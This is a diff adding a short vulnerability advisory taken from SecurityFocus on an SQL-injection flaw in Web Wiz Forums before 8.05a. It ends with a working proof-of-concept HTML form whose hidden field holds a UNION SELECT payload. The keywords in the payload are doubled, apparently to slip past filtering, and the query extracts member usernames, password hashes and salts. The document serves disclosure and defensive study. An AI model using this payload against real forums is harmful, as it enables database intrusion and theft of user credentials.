@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/23051/info
+
+
+Web Wiz Forums is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.
+
+This issue affects versions prior to 8.05a; other versions may also be affected.
+
+<form method="post"
+action="http://localhost/forum/pop_up_member_search.asp?">
+<input type="hidden" name="name" id="name" value="\"&#039; union
+select concat(userusernamename,char(58),passpasswordword,char(58),sasaltlt)
+from tblautauthorhor /*" >
+<input type="submit" value="Go">
+</form>
